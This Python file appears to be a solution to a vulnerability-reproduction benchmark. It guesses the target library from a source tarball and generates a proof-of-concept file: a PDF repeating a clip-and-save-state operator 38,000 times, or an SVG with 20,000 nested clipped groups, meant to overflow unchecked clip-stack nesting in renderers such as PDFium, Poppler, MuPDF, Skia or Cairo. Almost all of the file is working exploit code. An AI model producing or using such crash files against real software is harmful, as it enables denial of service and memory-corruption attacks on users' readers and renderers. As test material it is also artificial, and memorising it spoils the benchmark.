import os
import tarfile


def _generate_pdf_poc(n_depth: int) -> bytes:
    # Build a minimal valid PDF with a content stream that repeatedly pushes
    # clipping operations and saves the graphics state to create deep nesting.
    # Content: "0 0 100 100 re W n q\n" repeated n_depth times.
    # This should exercise clip marks and layer/clip stack nesting.
    content_line = b"0 0 100 100 re W n q\n"
    content = content_line * n_depth

    # Construct PDF objects
    objs = []

    # 1: Catalog
    objs.append(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
    # 2: Pages
    objs.append(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
    # 3: Page
    objs.append(
        b"3 0 obj\n"
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Contents 4 0 R >>\n"
        b"endobj\n"
    )
    # 4: Contents stream
    length_entry = b"/Length " + str(len(content)).encode("ascii")
    objs.append(
        b"4 0 obj\n<< " + length_entry + b" >>\nstream\n" + content + b"endstream\nendobj\n"
    )

    # Assemble PDF with correct xref
    header = b"%PDF-1.4\n%\xFF\xFF\xFF\xFF\n"
    parts = [header]
    offsets = []
    pos = len(header)
    for obj in objs:
        offsets.append(pos)
        parts.append(obj)
        pos += len(obj)

    # xref
    xref_start = pos
    xref = [b"xref\n0 5\n"]
    # free object
    xref.append(b"0000000000 65535 f \n")
    for off in offsets:
        xref.append(("{:010d} 00000 n \n".format(off)).encode("ascii"))
    xref_bytes = b"".join(xref)
    parts.append(xref_bytes)
    pos += len(xref_bytes)

    # trailer
    trailer = (
        b"trailer\n"
        b"<< /Size 5 /Root 1 0 R >>\n"
        b"startxref\n" + str(xref_start).encode("ascii") + b"\n%%EOF\n"
    )
    parts.append(trailer)

    return b"".join(parts)


def _generate_svg_poc(depth: int) -> bytes:
    # Generate SVG with deep nesting of groups each applying the same clip-path.
    # Define a single clipPath and nest groups to create deep clip stack.
    head = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">\n'
        b'  <defs>\n'
        b'    <clipPath id="c"><rect x="0" y="0" width="10" height="10"/></clipPath>\n'
        b'  </defs>\n'
        b'  <g clip-path="url(#c)">\n'
    )
    tail = b'  </g>\n</svg>\n'
    nested_open = b'    <g clip-path="url(#c)">\n'
    nested_close = b'    </g>\n'
    body = nested_open * depth + nested_close * depth
    rect = b'    <rect x="0" y="0" width="100" height="100" fill="black"/>\n'
    svg = head + body + rect + tail
    return svg


def _detect_project(src_path: str) -> str:
    # Attempt to detect the project to choose the best PoC format.
    # Returns a key among: "pdf", "svg".
    try:
        with tarfile.open(src_path, "r:*") as tf:
            names = [m.name.lower() for m in tf.getmembers() if m.isfile()]
    except Exception:
        names = []

    names_str = "\n".join(names)

    # Heuristics:
    # - If it's a PDF reader/rendering lib, prefer PDF PoC.
    pdf_markers = (
        "pdfium", "poppler", "mupdf", "pdfreader", "pdf_parser", "pdf-",
        "/fpdfsdk/", "pdfobjects", "/pdf/", "pdfstream", "pdfdoc"
    )
    if any(marker in names_str for marker in pdf_markers):
        return "pdf"

    # If it's Skia or Cairo, SVG often routes through clip stacks as well.
    svg_markers = ("skia", "cairo", "librsvg", "svg", "inkscape")
    if any(marker in names_str for marker in svg_markers):
        return "svg"

    # Default to PDF, as many projects accept/testing with PDF parsers.
    return "pdf"


class Solution:
    def solve(self, src_path: str) -> bytes:
        project = _detect_project(src_path)

        # Choose depth/size parameters. The goal is to be safely below OOM,
        # yet deep enough to exercise unchecked nesting.
        if project == "pdf":
            # Each line ~24 bytes; 38000 lines ~912kB content plus PDF overhead.
            # Close to the ground-truth scale, but not reliant on exact size.
            return _generate_pdf_poc(n_depth=38000)
        else:
            # SVG nesting:
            # Each nested group adds ~30 bytes. 20000 groups ~600kB plus header.
            return _generate_svg_poc(depth=20000)